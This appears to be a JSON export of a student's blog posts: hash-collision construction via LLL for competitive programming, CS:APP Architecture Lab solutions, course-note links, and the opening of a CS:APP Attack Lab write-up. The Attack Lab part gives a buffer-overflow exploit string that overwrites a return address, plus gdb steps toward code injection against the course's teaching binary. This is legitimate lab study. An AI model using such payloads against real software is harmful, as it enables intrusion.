[{"title":"卡哈希","path":"/2026/01/23/hash/","content":"本文摘自 cancan123456 的《卡哈希》。 本文基于 NOI WC 2024 csy 专家进行的讲解。 什么？你还在为卡不掉选手的十模哈希而感到痛苦？ 什么？你还在 CF hack 时看着对方的随机五十模数哈希而感到迷茫？ 不要担心，现隆重向您推出——LLL 算法卡哈希！ 在这之前，我们快速回顾一下几种简单的卡哈希方法。 OI 中常见的字符串哈希函数一般形如下式： H(s)=\\sum_{i=1}^{|s|}s_ib^i\\bmod p其中 $0\\le s_i26\\le bp$，且 $p$ 一般为质数。 多模哈希是选择多组 $(b,p)$，将 $H(s)$ 构成的有序对作为哈希结果。 单模哈希相信这个东西的卡法已经为人熟知了，直接随机一堆字符串看看有没有相同即可，利用了生日悖论。 这个做法挂亿会机也能找到双模哈希的碰撞。 自然溢出哈希$p=2^{64}$，对 $b$ 的奇偶性分类讨论： $b$ 为偶数，那么有 b^{64}\\equiv2^{64}\\left(\\dfrac b2\\right)^{64}\\equiv0\\pmod{2^{64}}所以只需要构造低 $64$ 位相同的字符串即可。 $b$ 为奇数，我们考虑字符集为 $\\{0,1\\}$ 的字符串 $s$，定义其取反 $\\bar s$ 为 $0$ 变为 $1$，$1$ 变为 $0$ 后得到的字符串。令 $s_1=[0],s_{i+1}=s_i+\\bar{s_i}$，那么容易发现 $H(s_{12})=H_{\\bar{s_{12}}}$。 多模哈希众所周知，某些选手在不会写 SA 或者 Z-function 或者 Manacher 等等字符串算法时会选择二分哈希这种做法，对于写正解的选手非常不公平，在介绍如何针对这些选手之前，先对 Lenstra-Lenstra-Lovász Lattice Reduction 算法 进行介绍。 格与基本文只关注欧几里得空间中由向量加法构成的格，所以我们给出格的定义： 格 是欧几里得空间 $\\mathbb R^n$ 的一个离散加法子群，且其中的元素可由 $n$ 个整系数的向量 基 线性组合生成。 换句话说，基就是 $n$ 个整数向量 $\\vec{v_i}$，格就是所有的 $\\sum k_i\\vec{v_i},k_i\\in\\mathbb Z$。 Gram-Schmidt 正交化先定义正交基： 正交基 是一组基 $\\vec{v_i}$，满足： \\forall i e j,\\vec{v_i}\\cdot\\vec{v_j}=0Gram-Schmidt 正交化可以将一组基 $\\vec{v_i}$ 变为一组正交基 $\\vec{v_i}^\\ast$。 Gram-Schmidt 正交化采用增量法构造，加入第一个向量时，直接令 $\\vec{v_1}^\\ast=\\vec{v_1}$ 即可。 加入第 $n+1$ 个向量时，我们考虑计算 $\\vec{v_n}$ 对 $\\vec{v_i}^\\ast,1\\le in$ 的投影，从 $\\vec{v_n}$ 中减去投影，具体可以参考这个图： 然后我们就得到了这个公式： \\vec{v_n}=\\vec{v_n}-\\sum_{i=1}^{n-1}\\frac{\\vec{v_i}\\cdot\\vec{v_n}}{\\vec{v_i}\\cdot\\vec{v_i}}\\vec{v_i}LLL 算法主体LLL 算法有一个参数 $\\delta$，需要满足 $\\dfrac14\\delta1$，一般取 $\\delta=\\dfrac34$。 定义一组基 $\\vec{v_i}$ 的 LLL reduced 条件： \\textbf{Size Condition}:|\\mu_{i,j}|=\\frac{|\\vec{v_i}\\cdot\\vec{v_j}^\\ast|}{|\\vec{v_j}^\\ast|^2}\\le\\frac12,\\text{ for all }1\\le j","categories":["Algoirthm"]},{"title":"CMU CS:APP Architecture Lab","path":"/2026/01/05/Architecture Lab/","content":"Architecture Labhttps://sunchaoyi923.github.io/file/Architecture%20Lab.pdf CS:APP Architecture Lab ReportName SUNCHAOYI To fix the build error with older versions of GCC, you’ll need to add the -fcommon to the compiler settings in misc/Makefile, pipe/Makefile and seq/Makefile. Change CFLAGS=-Wall -O1 -g to CFLAGS=-Wall -O1 -g -fcommon. Then change LCFLAGS=-O1 to LCFLAGS=-O1 -fcommon. Relative Tools : yas Y86 Assembler yis Y86 Instruction Set Simulator Source code (.ys) → yas assembler → Object file (.yo) → yis simulator Part A$\\texttt{sum.ys}$ Iteratively sum linked list elementsAssembly programs execute sequentially from top to bottom according to their layout in memory. The .pos 0 directive sets the program entry point at address 0. The stack: label is conventionally placed at 0x200 to separate the code section from the data section and provide dedicated stack space. The expected computation result is $\\texttt{0x00a + 0x0b0 + 0xc00 = 0xcba}$. Note that Y86-64 assemblers typically require a blank line at the end of the source file. Reference solution.pos 0 irmovq stack, %rsp call main halt.align 8ele1: .quad 0x00a .quad ele2ele2: .quad 0x0b0 .quad ele3ele3: .quad 0xc00 .quad 0main : irmovq ele1, %rdi call sum retsum : irmovq $0, %rax # long val = 0; jmp testloop : mrmovq (%rdi),%rsi # val += ls-val; addq %rsi, %rax mrmovq 8(%rdi), %rdi # ls = ls-next;test : andq %rdi, %rdi # while (ls) jne loop # continue if ls != NULL ret # return val;.pos 0x200stack: Execution ResultsStopped in 26 steps at PC = 0x13. Status HLT, CC Z=1 S=0 O=0Changes to registers:%rax: 0x0000000000000000 0x0000000000000cba%rsp: 0x0000000000000000 0x0000000000000200%rsi: 0x0000000000000000 0x0000000000000c00Changes to memory:0x01f0: 0x0000000000000000 0x000000000000005b0x01f8: 0x0000000000000000 0x0000000000000013 $\\texttt{rsum.ys}$ Recursively sum linked list elements Check base case: if (ptr == NULL) return 0; Save current node value to stack Recursively call r_sum with next pointer Pop saved value and add to recursive result Return final sum Note that Y86-64 does not have a test instruction, use andq for condition checking instead. Referrence solution.pos 0 irmovq stack, %rsp call main halt.align 8ele1: .quad 0x00a .quad ele2ele2: .quad 0x0b0 .quad ele3ele3: .quad 0xc00 .quad 0main : irmovq ele1, %rdi call r_sum retr_sum : andq %rdi, %rdi # if (!ls) je end # return 0; mrmovq (%rdi), %rbx # long val = ls-val; mrmovq 8(%rdi), %rdi # ls = ls-next; pushq %rbx # save val call r_sum # long rest = rsum_list(ls-next); popq %rbx # restore val addq %rbx,%rax # return val + rest; retend : irmovq $0, %rax ret.pos 0x200stack: Execution ResultsStopped in 37 steps at PC = 0x13. Status HLT, CC Z=0 S=0 O=0Changes to registers:%rax: 0x0000000000000000 0x0000000000000cba%rbx: 0x0000000000000000 0x000000000000000a%rsp: 0x0000000000000000 0x0000000000000200Changes to memory:0x01c0: 0x0000000000000000 0x00000000000000860x01c8: 0x0000000000000000 0x0000000000000c000x01d0: 0x0000000000000000 0x00000000000000860x01d8: 0x0000000000000000 0x00000000000000b00x01e0: 0x0000000000000000 0x00000000000000860x01e8: 0x0000000000000000 0x000000000000000a0x01f0: 0x0000000000000000 0x000000000000005b0x01f8: 0x0000000000000000 0x0000000000000013 Y86-64 does not support immediate operands in arithmetic instructions. Instead of addq $8, %rdi, must use irmovq $8, %r8 and addq %r8, %rdi instead. Computes XOR checksum: $\\texttt{0x00a} \\oplus \\texttt{0x0b0} \\oplus \\texttt{0xc00} = \\texttt{0xcba}.$ Overwrites destination values 0x111, 0x222, 0x333 with 0x00a, 0x0b0, 0xc00. Reference Solution.pos 0 irmovq stack, %rsp call main halt.align 8# Source blocksrc:.quad 0x00a.quad 0x0b0.quad 0xc00# Destination blockdest:.quad 0x111.quad 0x222.quad 0x333main: irmovq src, %rdi irmovq dest, %rsi irmovq $3, %rdx call copy retcopy: irmovq $0, %rax # long result = 0; irmovq $8, %r8 irmovq $1, %r9 je test # jump to condition checkloop: mrmovq (%rdi), %r10 # long val = *src++; addq %r8, %rdi # (src++) rmmovq %r10, (%rsi) # *dest++ = val; addq %r8, %rsi # (dest++) xorq %r10, %rax # result ^= val; subq %r9, %rdx # len--; test: andq %rdx, %rdx # while (len 0) jne loop # continue if len != 0 ret # return result;end: ret.pos 0x200stack: Execution ResultsStopped in 39 steps at PC = 0x13. Status HLT, CC Z=1 S=0 O=0Changes to registers:%rax: 0x0000000000000000 0x0000000000000cba%rsp: 0x0000000000000000 0x0000000000000200%rsi: 0x0000000000000000 0x0000000000000048%rdi: 0x0000000000000000 0x0000000000000030%r8: 0x0000000000000000 0x0000000000000008%r9: 0x0000000000000000 0x0000000000000001%r10: 0x0000000000000000 0x0000000000000c00Changes to memory:0x0030: 0x0000000000000111 0x000000000000000a0x0038: 0x0000000000000222 0x00000000000000b00x0040: 0x0000000000000333 0x0000000000000c000x01f0: 0x0000000000000000 0x000000000000006f0x01f8: 0x0000000000000000 0x0000000000000013 Part BTo fix the undefined reference to matherr error, comment out the unused matherr function declaration in ssim.c. The goal is to extend the SEQ processor to support the iaddq instruction, which adds an immediate value to a register iaddq V, rB → rB = rB + V. Fetch Stagebool instr_valid = icode in INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ, IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ ;bool need_regids =\ticode in IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ ;bool need_valC =\ticode in IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL,IIADDQ ; Declare IIADDQ as a valid instruction so the processor recognizes it. IIADDQ needs a register byte to specify rB (the destination register). IIADDQ requires an immediate value V, which is stored in the constant word valC. Decode Stageword srcB = [\ticode in IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ : rB;\ticode in IPUSHQ, IPOPQ, ICALL, IRET : RRSP;\t1 : RNONE; # Dont need register];word dstE = [\ticode in IRRMOVQ Cnd : rB;\ticode in IIRMOVQ, IOPQ, IIADDQ : rB;\ticode in IPUSHQ, IPOPQ, ICALL, IRET : RRSP;\t1 : RNONE; # Dont write any register]; IIADDQ needs to read register rB to get its current value (valB = Reg[rB]). IIADDQ writes the result back to register rB (through dstE). Execute Stageword aluA = [\ticode in IRRMOVQ, IOPQ : valA;\ticode in IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ : valC;\ticode in ICALL, IPUSHQ : -8;\ticode in IRET, IPOPQ : 8;\t# Other instructions dont need ALU];## Select input B to ALUword aluB = [\ticode in IRMMOVQ, IMRMOVQ, IOPQ, ICALL, IPUSHQ, IRET, IPOPQ, IIADDQ : valB;\ticode in IRRMOVQ, IIRMOVQ : 0;\t# Other instructions dont need ALU];bool set_cc = icode in IOPQ, IIADDQ ; For IIADDQ, aluA uses the immediate value valC. aluB uses valB (the current value of register rB). Like arithmetic operations (IOPQ), iaddq should update the condition codes (ZF, SF, OF). Memory Stage Program Counter UpdateNo need to update. Run Verification Tests(cd ../y86-code; make testssim)(cd ../ptest; make SIM=../seq/ssim)(cd ../ptest; make SIM=../seq/ssim TFLAGS=-i) Expected OutputAll tests should pass with messages like: asum.seq:ISA Check Succeedsasumr.seq:ISA Check Succeedscjr.seq:ISA Check Succeedsj-cc.seq:ISA Check Succeedspoptest.seq:ISA Check Succeedsprog1.seq:ISA Check Succeedsprog2.seq:ISA Check Succeedsprog3.seq:ISA Check Succeedsprog4.seq:ISA Check Succeedsprog5.seq:ISA Check Succeedsprog6.seq:ISA Check Succeedsprog7.seq:ISA Check Succeedsprog8.seq:ISA Check Succeedspushquestion.seq:ISA Check Succeedspushtest.seq:ISA Check Succeedsret-hazard.seq:ISA Check SucceedsAll 49 ISA Checks SucceedAll 64 ISA Checks SucceedAll 22 ISA Checks SucceedAll 600 ISA Checks SucceedAll 58 ISA Checks SucceedAll 96 ISA Checks SucceedAll 22 ISA Checks SucceedAll 756 ISA Checks Succeed Part CCommandCompilationNote that each time you modify your pipe-full.hcl file, you can rebuild the simulator by typing make psim VERSION=full. Each time you modify your ncopy.ys program, you can rebuild the driver programs by typing make drivers. You can type make VERSION=full to rebuild the simulator and the driver programs. Test pipe-full.hclcd ../ptest; make SIM=../pipe/psimcd ../ptest; make SIM=../pipe/psim TFLAGS=-i Test your code on a range of block lengths with the ISA simulator./correctness.pl Partial Score./benchmark.pl Refference Solution Some suggestions in the pdf Reordering instructions, replacing groups of instructions with single instructions, deleting some instructions, and adding other instructions. You may ﬁnd it useful to read about loop unrolling. First, add IIADDQ instruction support to pipe-full.hcl as required in Part B. Before proceeding to the next step, ensure that your implementation passes all tests similiar to Part B. Original CPE Average CPE 15.18. Then try to use IIADDQ in the ncopy.ys: Loop: mrmovq (%rdi), %r10\t# read val from src...\trmmovq %r10, (%rsi)\t# ...and store it to dst\tandq %r10, %r10 # val = 0?\tjle Npos # if so, goto Npos:\tiaddq $1, %rax # count++Npos: iaddq $-1, %rdx # len--\tiaddq $8, %rdi # src++\tiaddq $8, %rsi # dst++\tandq %rdx,%rdx # len 0?\tjg Loop # if so, goto Loop: The current implementation achieves an Average CPE of 12.70, but the performance score remains at 0.0/60.0. Loop unrolling was attempted to improve performance. After experimentation, $4 \\times$ loop unrolling yields with Average CPE of 10.79. Default Register Initialization In Y86-64, registers are initialized to zero by default. Therefore, the explicit xorq %rax,%rax instruction can be omitted, reducing the instruction count. Loop Unrolling Subtract the unroll factor from the length counter. If the result is negative, handle remaining elements separately. Otherwise, restore the counter and execute the unrolled loop. andq %rdx,%rdx jle DoneLoop: iaddq $-4, %rdx jl addwork1: iaddq $4, %rdx mrmovq (%rdi),%r8 rmmovq %r8, (%rsi) andq %r8, %r8 jle work2 iaddq $1, %raxwork2: mrmovq 8(%rdi),%r8 rmmovq %r8, 8(%rsi) andq %r8, %r8 jle work3 iaddq $1, %raxwork3: mrmovq 16(%rdi),%r8 rmmovq %r8, 16(%rsi) andq %r8, %r8 jle work4 iaddq $1, %raxwork4: mrmovq 24(%rdi),%r8 rmmovq %r8, 24(%rsi) andq %r8, %r8 jle modify iaddq $1, %raxmodify: iaddq $32,%rdi iaddq $32,%rsi iaddq $-4,%rdx jge Loopadd: iaddq $4, %rdxremain: je Done mrmovq (%rdi), %r10 rmmovq %r10, (%rsi) andq %r10, %r10 jle Npos iaddq $1, %raxNpos: iaddq $-1, %rdx iaddq $8, %rdi iaddq $8, %rsi andq %rdx,%rdx jg remain Handle Data hazards To reduce data hazards in the pipeline, we employ 6-way loop unrolling with early loading of data values by using additional registers (%r8, %r9, %r10, %r11, $\\cdots$) to pre‑fetch memory operands. The optimized implementation achieves an average CPE of 7.96. ncopy: iaddq $-6, %rdx jl res1work1: mrmovq (%rdi),%r8 mrmovq 8(%rdi),%r9 rmmovq %r8, (%rsi) andq %r8, %r8 jle work2 iaddq $1, %raxwork2: rmmovq %r9,8(%rsi) mrmovq 16(%rdi),%r10 andq %r9, %r9 jle work3 iaddq $1, %raxwork3: rmmovq %r10,16(%rsi) mrmovq 24(%rdi),%r11 andq %r10, %r10 jle work4 iaddq $1, %raxwork4: rmmovq %r11,24(%rsi) mrmovq 32(%rdi),%r8 andq %r11, %r11 jle work5 iaddq $1, %raxwork5: rmmovq %r8,32(%rsi) mrmovq 40(%rdi),%r9 andq %r8, %r8 jle work6 iaddq $1, %raxwork6: rmmovq %r9,40(%rsi) andq %r9, %r9 jle modify iaddq $1, %raxmodify: iaddq $48,%rdi iaddq $48,%rsi iaddq $-6,%rdx jge work1res1: iaddq $5, %rdx jl Done mrmovq (%rdi), %r8 mrmovq 8(%rdi), %r9 rmmovq %r8, (%rsi) andq %r8, %r8 jle res2 iaddq $1, %raxres2: iaddq $-1, %rdx jl Done mrmovq 16(%rdi), %r10 rmmovq %r9, 8(%rsi) andq %r9, %r9 jle res3 iaddq $1, %raxres3: iaddq $-1, %rdx jl Done mrmovq 24(%rdi), %r11 rmmovq %r10, 16(%rsi) andq %r10, %r10 jle res4 iaddq $1, %raxres4: iaddq $-1, %rdx jl Done mrmovq 32(%rdi), %r8 rmmovq %r11, 24(%rsi) andq %r11, %r11 jle res5 iaddq $1, %raxres5: iaddq $-1, %rdx jl Done rmmovq %r8, 32(%rsi) andq %r8, %r8 jle Done iaddq $1, %rax Optimaze the Remaining Part A tree-like comparison structure reduces branch instructions by hierarchically testing the remaining length, cutting down the average number of comparisons per iteration. Furthermore, by reordering certain comparison operations, the overall code size has been reduced, enabling higher execution efficiency within the strict byte constraint. iaddq $-10, %rdx jl f09pre: mrmovq (%rdi), %r8 mrmovq 8(%rdi), %r9 mrmovq 16(%rdi), %r10 mrmovq 24(%rdi), %r11 mrmovq 32(%rdi), %r12 mrmovq 40(%rdi), %r13 mrmovq 48(%rdi), %r14 mrmovq 56(%rdi), %rbx mrmovq 64(%rdi), %rcx mrmovq 72(%rdi), %rbpwork1: rmmovq %r8, (%rsi) andq %r8, %r8 jle work2 iaddq $1, %raxwork2: rmmovq %r9, 8(%rsi) andq %r9, %r9 jle work3 iaddq $1, %raxwork3: rmmovq %r10, 16(%rsi) andq %r10, %r10 jle work4 iaddq $1, %raxwork4: rmmovq %r11, 24(%rsi) andq %r11, %r11 jle work5 iaddq $1, %raxwork5: rmmovq %r12, 32(%rsi) andq %r12, %r12 jle work6 iaddq $1, %raxwork6: rmmovq %r13, 40(%rsi) andq %r13, %r13 jle work7 iaddq $1, %raxwork7: rmmovq %r14, 48(%rsi) andq %r14, %r14 jle work8 iaddq $1, %raxwork8: rmmovq %rbx, 56(%rsi) andq %rbx, %rbx jle work9 iaddq $1, %raxwork9: rmmovq %rcx, 64(%rsi) andq %rcx, %rcx jle work10 iaddq $1, %raxwork10: rmmovq %rbp, 72(%rsi) andq %rbp, %rbp jle modify iaddq $1, %raxmodify: iaddq $0x50,%rdi iaddq $0x50,%rsi iaddq $-10,%rdx jge pref09: iaddq $7, %rdx jg f49 jl f02 je rem3f02: iaddq $2, %rdx je rem1 jg rem2 jl Donef46: iaddq $2, %rdx jl rem4 je rem5 jg rem6f49: iaddq $-4, %rdx jl f46 je rem7f89: iaddq $-2, %rdx jl rem8rem9: mrmovq 0x40(%rdi), %r8 rmmovq %r8, 0x40(%rsi) andq %r8, %r8 jle rem8 iaddq $1, %raxrem8: mrmovq 0x38(%rdi), %r8 rmmovq %r8, 0x38(%rsi) andq %r8, %r8 jle rem7 iaddq $1, %raxrem7: mrmovq 0x30(%rdi), %r8 rmmovq %r8, 0x30(%rsi) andq %r8, %r8 jle rem6 iaddq $1, %raxrem6: mrmovq 0x28(%rdi), %r8 rmmovq %r8, 0x28(%rsi) andq %r8, %r8 jle rem5 iaddq $1, %raxrem5: mrmovq 0x20(%rdi), %r8 rmmovq %r8, 0x20(%rsi) andq %r8, %r8 jle rem4 iaddq $1, %raxrem4: mrmovq 0x18(%rdi), %r8 rmmovq %r8, 0x18(%rsi) andq %r8, %r8 jle rem3 iaddq $1, %raxrem3: mrmovq 0x10(%rdi), %r8 rmmovq %r8, 0x10(%rsi) andq %r8, %r8 jle rem2 iaddq $1, %raxrem2: mrmovq 0x8(%rdi), %r8 rmmovq %r8, 0x8(%rsi) andq %r8, %r8 jle rem1 iaddq $1, %raxrem1: mrmovq (%rdi), %r8 rmmovq %r8, (%rsi) andq %r8, %r8 jle Done iaddq $1, %rax The average CPE has improved to 7.66. The remainder cases are handled using a carefully structured decision tree. Special attention must be paid to the interleaving of mrmovq and andq instructions, as they directly affect global condition codes. Specifically, the jle instruction condition (SF ^ OF) | ZF = 1 requires precise control over flag states. This ensures that jl or jg branches correctly direct execution to the appropriate remainder-handling routines; otherwise, incorrect flag propagation could lead to erroneous counting. (Reference Article) iaddq $-10, %rdx jl f09pre: mrmovq (%rdi), %r8 mrmovq 8(%rdi), %r9 mrmovq 16(%rdi), %r10 mrmovq 24(%rdi), %r11 mrmovq 32(%rdi), %r12 mrmovq 40(%rdi), %r13 mrmovq 48(%rdi), %r14 mrmovq 56(%rdi), %rbx mrmovq 64(%rdi), %rcx mrmovq 72(%rdi), %rbpwork1: rmmovq %r8, (%rsi) andq %r8, %r8 jle work2 iaddq $1, %raxwork2: rmmovq %r9, 8(%rsi) andq %r9, %r9 jle work3 iaddq $1, %raxwork3: rmmovq %r10, 16(%rsi) andq %r10, %r10 jle work4 iaddq $1, %raxwork4: rmmovq %r11, 24(%rsi) andq %r11, %r11 jle work5 iaddq $1, %raxwork5: rmmovq %r12, 32(%rsi) andq %r12, %r12 jle work6 iaddq $1, %raxwork6: rmmovq %r13, 40(%rsi) andq %r13, %r13 jle work7 iaddq $1, %raxwork7: rmmovq %r14, 48(%rsi) andq %r14, %r14 jle work8 iaddq $1, %raxwork8: rmmovq %rbx, 56(%rsi) andq %rbx, %rbx jle work9 iaddq $1, %raxwork9: rmmovq %rcx, 64(%rsi) andq %rcx, %rcx jle work10 iaddq $1, %raxwork10: rmmovq %rbp, 72(%rsi) andq %rbp, %rbp jle modify iaddq $1, %raxmodify: iaddq $0x50,%rdi iaddq $0x50,%rsi iaddq $-10,%rdx jge pref09: iaddq $7, %rdx jg f49 jl f02 je rem3f02: iaddq $2, %rdx je rem1 iaddq $-1, %rdx je rem2 retf49: iaddq $-3, %rdx jg f79 je rem6 iaddq $1, %rdx je rem5 jmp rem4f79: iaddq $-2, %rdx jl rem7 je rem8rem9: mrmovq 64(%rdi), %r8 andq %r8, %r8 rmmovq %r8, 64(%rsi)rem8: mrmovq 56(%rdi), %r8 jle ex9 iaddq $1, %raxex9: rmmovq %r8, 56(%rsi) andq %r8, %r8rem7: mrmovq 48(%rdi), %r8 jle ex8 iaddq $1, %raxex8: rmmovq %r8, 48(%rsi) andq %r8, %r8rem6: mrmovq 40(%rdi), %r8 jle ex7 iaddq $1, %raxex7: rmmovq %r8, 40(%rsi) andq %r8, %r8rem5: mrmovq 32(%rdi), %r8 jle ex6 iaddq $1, %raxex6: rmmovq %r8, 32(%rsi) andq %r8, %r8rem4: mrmovq 24(%rdi), %r8 jle ex5 iaddq $1, %raxex5: rmmovq %r8, 24(%rsi) andq %r8, %r8rem3: mrmovq 16(%rdi), %r8 jle ex4 iaddq $1, %raxex4: rmmovq %r8, 16(%rsi) andq %r8, %r8rem2: mrmovq 8(%rdi), %r8 jle ex3 iaddq $1, %raxex3: rmmovq %r8, 8(%rsi) andq %r8, %r8rem1: mrmovq (%rdi), %r8 jle ex2 iaddq $1, %raxex2: rmmovq %r8, (%rsi) andq %r8, %r8 jle Done iaddq $1, %rax After implementing comprehensive pipeline optimizations including register preloading and careful remainder handling, the implementation achieved: Average CPE 7.50Score 60.0/60.0 Modify HCL (extra) The expression E_icode in IMRMOVQ, IPOPQ E_dstM in d_srcA, d_srcB identifies load/use hazards in the pipeline. Instruction and Cycle 1 2 3 4 5 6 mrmov I1(%rax) %rbx F D E M W - rmmov %rbx I2(%rax) - F D E M W In the pipeline timeline, the first instruction reads data from memory during its Memory stage (cycle 4). The second instruction needs that same data during its own Memory stage (cycle 5). Because the data is available one cycle before it is needed, forwarding is possible: the value from m_valM can be routed directly to the valA field in the next instruction’s pipeline register, bypassing the register file. Load forwarding works when two conditions are met: The current instruction loads a value from memory into a register (e.g., mrmovq or popq) and uses that register as the source operand. The next instruction uses that same register as a source operand not in its Execute stage, but only later, during its Memory stage — typically in store-type instructions such as rmmovq or pushq. To support this, a forwarding path is added that connects the memory output signal m_valM to the valA input of the pipeline register M, allowing it to be passed directly to e_valA in the following instruction. Formally, the forwarding condition can be expressed as E_icode in IMRMOVQ, IPOPQ E_srcA == M_dstM. Therefore, only the following control logic will trigger load/use hazard handling: E_icode in IMRMOVQ, IPOPQ (E_dstM == d_srcB || (E_dstM == d_srcA !(D_icode in IMRMOVQ, IPUSHQ ))) The logic for e_valA in the Execute stage must be updated to select the forwarded value from memory when applicable: word e_valA = [E_icode in IRMMOVQ, IPUSHQ E_srcA == M_dstM: m_valM; 1 : E_valA; # Use valA from stage pipe register]; The pipeline control logic must also be adjusted to handle load/use hazards appropriately: bool F_bubble = 0;bool F_stall = # Conditions for a load/use hazard (E_icode in IMRMOVQ, IPOPQ (E_dstM == d_srcB || (E_dstM == d_srcA !(D_icode in IMRMOVQ, IPUSHQ )))) || # Stalling at fetch while ret passes through pipeline IRET in D_icode, E_icode, M_icode ;# Should I stall or inject a bubble into Pipeline Register D?# At most one of these can be true.bool D_stall = # Conditions for a load/use hazard E_icode in IMRMOVQ, IPOPQ (E_dstM == d_srcB || (E_dstM == d_srcA !(D_icode in IMRMOVQ, IPUSHQ )));bool D_bubble = # Mispredicted branch (E_icode == IJXX !e_Cnd) || # Stalling at fetch while ret passes through pipeline # but not condition for a load/use hazard !(E_icode in IMRMOVQ, IPOPQ (E_dstM == d_srcB || (E_dstM == d_srcA !(D_icode in IMRMOVQ, IPUSHQ )))) IRET in D_icode, E_icode, M_icode ;# Should I stall or inject a bubble into Pipeline Register E?# At most one of these can be true.bool E_stall = 0;bool E_bubble = # Mispredicted branch (E_icode == IJXX !e_Cnd) || # Conditions for a load/use hazard (E_icode in IMRMOVQ, IPOPQ (E_dstM == d_srcB || (E_dstM == d_srcA !(D_icode in IMRMOVQ, IPUSHQ ))));","categories":["Academy"]},{"title":"CUHK-Shenzhen Notes","path":"/2026/01/01/CUHKSZ Notes/","content":"MAT-1011 Calculus (Extended) IIt provides students with a good foundation for more advanced courses in the MATH major. Topics include functions, sequences, limits and continuity, differentiation, and integration and their applications. MAT1011 and its continuation MAT1012 are for students who are strongly inclined to declare for MATH. The treatment in these classes is adapted to the future needs in the MATH programme and aligns the students to the recommended study scheme in the MATH programme. MAT1011https://sunchaoyi923.github.io/file/MAT1011.pdf DDA-2001 Introduction to Data ScienceThe course will introduce the various areas of Data Science. It will give students a tour of the enormous applications of data science in our society. Along the tour, the course will also introduce different tools in the data science which will enable those applications. It will introduce the courses offered in the school and the research areas of professors. DDA2001https://sunchaoyi923.github.io/file/DDA2001.pdf MAT-1002 Calculus IIThis course is a continuation of Calculus I, covering series and multivariable calculus. It emphasizes intuitive and conceptual understanding of theory of series and multivariable calculus, as well as computation skills; it cultivates the ability to use Calculus to solve problems within mathematics and from other scientific disciplines. MAT1002https://sunchaoyi923.github.io/file/MAT1002.pdf MAT-2041 Linear Algebra and ApplicationsThis course introduces the fundamental concepts and techniques of linear algebra, including: system of linear equations, matrices, vectors, vector spaces, determinants, linear transformations, orthogonality, eigen-theory, quadratic forms and singular value decomposition. MAT2041https://sunchaoyi923.github.io/file/MAT2041.pdf CSC-3001 Discrete MathematicsThis course introduces the relevant mathematical concepts and techniques in computer science with emphasis on proofs and rigorous reasoning. Topics include: logics, methods of proofs, recursion, elementary number theory, graph theory, counting. CSC3001 Noteshttps://sunchaoyi923.github.io/file/CSC3001%20Notes.pdf CSC3001 Reviewhttps://sunchaoyi923.github.io/file/CSC3001%20Review.pdf STA-2001 Probability and Statistics IThis course is to study the basic concepts of probability and statistics. Topics include elementary probability theory, random variables, probability distributions, sampling distributions, convergence of random variables, laws of large numbers and central limit theorem. STA2001https://sunchaoyi923.github.io/file/STA2001.pdf CSC-1003 Introduction to Computer Science and Java ProgrammingThe course introduces basic concepts in computer science and application development using Java language, not assuming the previous related background of the students. Topics include: elements of programming: variables; assignment statements; built-in types of data; conditionals and loops; arrays; and input/output. functions: highlights the idea of dividing a program into components that can be independently developed and maintained. object-oriented programming: emphasizes the concept of a data type and its implementation, using Java class mechanism. basic concepts in computer science: discusses a few essential algorithms, data structures, and notions in other popular languages such as Python. CSC1003 Midterm Reviewhttps://sunchaoyi923.github.io/file/CSC1003%20Midterm%20Review.pdf CSC-3200 Data Structures and Advanced ProgrammingThe course focuses on the introduction of C/C++ language and various commonly used data types. Topics include C/C++ language basics, function and library, string and stream, pointer and dynamic memory management, class and template. Abstract data types such as array, linked list, stack, queue, tree, set，hashtable, graph and their implementations using C++ will be introduced in this class. CSC3200 Final Reviewhttps://sunchaoyi923.github.io/file/CSC3200%20Final%20Review.pdf CSC-4303 Network ProgrammingThe course introduces basic network protocols and programming practices, such as TCP/IP, HTTP, socket programming, and RPC. It also presents the design and implementation of real-world networked systems, including distributed file systems and computation frameworks. CSC4303https://sunchaoyi923.github.io/file/CSC4303 CSC-3060 Introduction to Computer SystemsThe course provides a programmer’s view of how computer systems execute programs, store information, and communicate. It enables students to become more effective programmers, especially in dealing with issues of performance, portability and robustness. It also serves as a foundation for courses on compilers, networks, and operating systems, where a deeper understanding of systems-level issues is required. Topics include: digital logic design, machine-level code and its generation, performance evaluation and optimization, computer arithmetic, memory organization and management, networking technology and protocols, and supporting concurrent computation. CSC3060https://sunchaoyi923.github.io/file/CSC3060","categories":["Academy"]},{"title":"CMU CS:APP Attack Lab","path":"/2025/12/28/Attack Lab/","content":"Attack Labhttps://sunchaoyi923.github.io/file/Attack%20Lab.pdf CS:APP Attack Lab ReportName SUNCHAOYI Use the -q flag when running the target programs to avoid connecting to the grading server: ./ctarget -q / ./rtarget -q. Part 1 Code Injection AttacksLevel 1First use objdump -d ctarjet ctarjet.asm to analyze the machine instructions of the target program. Analysis of the disassembly reveals the addresses of the key functions: test, getbuf, and touch1. The objective is to modify the control flow when getbuf returns. Normally, getbuf returns to address 0x401976 within test. The goal is to overwrite this return address with the address of touch1, which is 0x4017c0. Examination of the getbuf function shows that it allocates 0x28 (40) bytes on the stack for the input buffer. To successfully redirect execution, the exploit must completely fill this 40-byte buffer and then overwrite the subsequent 8 bytes on the stack, which hold the saved return address. The target address, 0x4017c0, must be written in little-endian byte order in x86-64. Therefore, the exploit string is: 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00c0 17 40 00 00 00 00 00 Create a text file (e.g., exploit.txt) and construct the attack string according to the specified format (two hex digits per byte, separated by spaces). Use the following pipeline to convert the text file to raw bytes and feed them to the target program: ./hex2raw exploit.txt | ./ctarget. Level 2The goal is to redirect program execution from getbuf to touch2 by injecting code that sets %rdi to the cookie value, exploiting a buffer overflow vulnerability in the Gets() function call. The initial step involves locating the call site of the Gets function. The instruction call 401a40 Gets is found at address 0x4017af. Using GDB, a breakpoint is set at this address to inspect the runtime stack state. (gdb) b *0x4017af(gdb) r -q(gdb) display /x %rsp The inspection reveals the stack pointer (%rsp) holds the value 0x5561dc78, which indicates the starting address of the input buffer allocated by getbuf. The core of the exploit is a short sequence of machine instructions. This sequence is designed to load the cookie value (0x59b997fa) into the %rdi register and then transfer control to the touch2 function. 